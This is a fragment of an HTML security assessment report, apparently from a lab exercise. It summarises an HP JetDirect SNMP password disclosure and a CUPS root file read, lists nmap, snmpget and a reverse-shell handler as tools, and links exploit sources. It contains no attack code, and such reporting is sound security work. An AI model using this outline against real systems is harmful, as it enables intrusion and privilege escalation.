+        <h1 id="0b7a658d-c51f-4499-a364-0ae5ce0f2668">
+          Vulnerabilities summary
+        </h1>
+        <h2 id="d68b5f54-697d-45dc-ac80-f663d5c55708">
+          
+            Information disclosure (CVE-2002-1048)
+          
+        </h2>
+        <table id="750edab8-0765-42b9-9081-e7d87f55905f">
+          <thead>
+            <tr id="908b42ea-f526-4805-8395-299ad814e06b">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="77ce6855-ae18-4607-9a3e-cdc548ba0bcb">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                SNMP service
+              </td>
+            </tr>
+            <tr id="c864f847-e2a3-4e03-8e15-875540837725">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.5
+                
+              </td>
+            </tr>
+            <tr id="fa0aed8b-d24e-4fb8-bb44-048523e0971c">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="bee547d7-0133-4ab0-99cb-9b46af33f411">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="10c7660e-5b33-4bd7-92ea-1d14918bef83">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to retrive the password for the telnet and web services of HP JetDirect. 
+                
+                
+                This has a 
+                
+                
+                  l
+                
+                
+                  
+                    ow
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity 
+                  
+                
+                
+                  and 
+                
+                
+                  
+                    availability
+                  
+                
+                 of the affected component.
+              </td>
+            </tr>
+            <tr id="a90362bd-9411-43a4-989e-a4846d92a9df">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                - Upgrade the affected product to a newer version
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="e23853d6-eaab-4317-9819-2ffc7fba9096">
+          
+            Root file read (CVE-2012-5519)
+          
+        </h2>
+        <table id="e727c655-3b54-47bc-932d-24a88d92aac4">
+          <thead>
+            <tr id="e7b16253-04ca-4763-a426-451eb70fd6f7">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="1f38751f-0fca-438d-8543-ca267c056d6f">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                CUPS
+              </td>
+            </tr>
+            <tr id="4c5a80b3-bb17-40e8-8e90-c22879fef428">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.2
+                
+              </td>
+            </tr>
+            <tr id="fc0e7541-b0b6-4be9-a33c-32bf3165ba69">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="d254f40d-3c72-4cb4-91f0-f0fd6d607633">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                Local
+              </td>
+            </tr>
+            <tr id="2ddf7e6a-0ef8-49b3-bff7-0190327cb45b">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to read arbitrary files as root. 
+                
+                
+                This has a 
+                
+                
+                  high
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity 
+                  
+                
+                
+                  and 
+                
+                
+                  
+                    availability
+                  
+                
+                 of the entire system.
+              </td>
+            </tr>
+            <tr id="8c06b61f-cae5-4015-bac1-272c1a083fab">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                - Update the affected component to a newer version
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="40b17c9d-cd64-4d38-b76c-496fb730ec78">
+          Tools used
+        </h1>
+        <table id="ab0559c2-bfd6-414b-90b8-9f50f00aad94">
+          <thead>
+            <tr id="ee0dd2b6-97e0-49c1-9a46-44e263c06cf1">
+              <th id="`&gt;MF">
+                Tool
+              </th>
+              <th id="A|qY">
+                Purpose
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="d878871c-c874-43e5-9a04-54c78026d884">
+              <td id="`&gt;MF">
+                nmap
+              </td>
+              <td id="A|qY">
+                - Scan for open ports
+                
+                - Scan for services versions
+                
+              </td>
+            </tr>
+            <tr id="6d227bd1-28a5-4ecd-a853-7a5b84436023">
+              <td id="`&gt;MF">
+                snmpget
+              </td>
+              <td id="A|qY">
+                - Send SNMP get requests to the vulnerable printer
+              </td>
+            </tr>
+            <tr id="00200cb4-ac4b-46ad-b3b2-63b6f447f639">
+              <td id="`&gt;MF">
+                pwncat-cs
+              </td>
+              <td id="A|qY">
+                - Handle reverse shell connection
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="5b56d0c5-b40f-49a0-a0d4-f782d443c541">
+          Sources
+        </h1>
+        <ul id="77434846-2ce4-4357-909a-33403e5b694e">
+          <li>
+            SNMP JetAdmin Device Password Disclosure : 
+            <a href="https://www.exploit-db.com/exploits/22319">
+              https://www.exploit-db.com/exploits/22319
+            </a>
+          </li>
+        </ul>
+        <ul id="82a707b8-907c-419c-b29b-8158555035d6">
+          <li>
+            CUPS 1.6.1 root file read : 
+            <a href="https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh">
+              https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh
+            </a>
+          </li>
+        </ul>
+        <p id="fb3683bd-4870-4838-b1b1-88bdf3a02be8">
+          
+
+        </p>
+      </div>
+    
+    <span>
+    </span>
+  
+
